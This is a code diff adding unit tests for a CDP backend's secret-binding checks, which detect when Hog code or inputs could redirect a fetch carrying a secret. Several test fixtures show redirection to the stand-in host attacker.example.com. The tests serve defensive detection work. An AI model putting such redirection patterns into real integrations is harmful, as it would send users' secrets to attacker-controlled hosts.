@@ -19,9 +19,12 @@ from products.cdp.backend.validation import (
     InputsSchemaItemSerializer,
     InputsSchemaSerializer,
     RecordAliasRewriter,
+    SecretBinding,
     compile_hog,
+    fetch_url_input_keys,
     generate_template_bytecode,
     reserved_functions_used,
+    secret_binding_changed,
 )
 from products.messaging.backend.facade.api import validate_design
 
@@ -1595,3 +1598,63 @@ class TestReservedFunctionsUsed(SimpleTestCase):
     )
     def test_reserved_functions_used(self, _name: str, hog: str, expected: set[str]) -> None:
         assert reserved_functions_used(hog) == expected
+
+
+class TestSecretBinding(SimpleTestCase):
+    @parameterized.expand(
+        [
+            ("direct", "fetch(inputs.url, {'body': inputs.body})", {"url"}),
+            ("string_template", "fetch(f'https://{inputs.host}/v1/{inputs.path}', {})", {"host", "path"}),
+            ("bracket_access", "fetch(inputs['url'], {})", {"url"}),
+            ("variable", "let base := inputs.host\nlet url := f'https://{base}/track'\nfetch(url, {})", {"host"}),
+            ("reassigned", "let url := 'https://a.example.com'\nurl := inputs.override\nfetch(url, {})", {"override"}),
+            ("function_param", "fun send(target) { fetch(target, {}) }\nsend(inputs.url)", {"url"}),
+            ("function_return", "fun target() { return inputs.url }\nfetch(target(), {})", {"url"}),
+            ("for_in", "for (let target in inputs.urls) { fetch(target, {}) }", {"urls"}),
+            ("constant_url", "fetch('https://api.example.com', {'body': inputs.body})", set()),
+            ("whole_inputs", "let config := inputs\nfetch(config.url, {})", None),
+            ("lambda_arg", "arrayMap(target -> fetch(target, {}), inputs.urls)", None),
+            ("fetch_alias", "let send := fetch\nsend(inputs.url, {})", None),
+            ("fetch_redefined", "fun fetch(target) { return target }\nfetch(inputs.url)", None),
+            ("input_overwritten", "inputs.url := 'https://attacker.example.com'\nfetch(inputs.url, {})", None),
+            ("typescript", "export function onLoad({ inputs }: any) { return fetch(inputs.url) }", None),
+        ]
+    )
+    def test_fetch_url_input_keys(self, _name: str, code: str, expected: set[str] | None) -> None:
+        keys = fetch_url_input_keys(code)
+        assert (set(keys) if keys is not None else None) == expected
+
+    CODE = "fetch(f'https://{inputs.host}/track', {'body': inputs.body})"
+    STORED = SecretBinding(
+        code=CODE,
+        inputs={"host": {"value": "api.example.com"}, "body": {"value": "a"}, "region": {"value": "us"}},
+    )
+
+    @parameterized.expand(
+        [
+            ("body_change", {}, {"body": {"value": "b"}}, None, False),
+            ("secret_value_ignored", {}, {"api_key": {"secret": True}}, None, False),
+            ("host_change", {}, {"host": {"value": "attacker.example.com"}}, None, True),
+            ("host_templates_another_input", {}, {"host": {"value": "{inputs.region}.example.com"}}, None, True),
+            ("code_change_keeps_url", {"code": f"{CODE}\nprint('sent')"}, {}, None, False),
+            ("code_change_moves_url", {"code": "fetch(inputs.body, {})"}, {}, None, True),
+            (
+                "code_change_adds_fetch",
+                {"code": f"{CODE}\nfetch('https://attacker.example.com', {{}})"},
+                {},
+                None,
+                True,
+            ),
+            ("mapping_overrides_host", {}, {}, [{"inputs": {"host": {"value": "attacker.example.com"}}}], True),
+            ("mapping_sets_body", {}, {}, [{"inputs": {"body": {"value": "c"}}}], False),
+        ]
+    )
+    def test_secret_binding_changed(
+        self, _name: str, binding_change: dict, input_changes: dict, mappings: list | None, expected: bool
+    ) -> None:
+        current = SecretBinding(
+            code=binding_change.get("code", self.CODE),
+            inputs={**self.STORED.inputs, **input_changes},
+            mappings=mappings,
+        )
+        assert secret_binding_changed(self.STORED, current, {"api_key"}) is expected
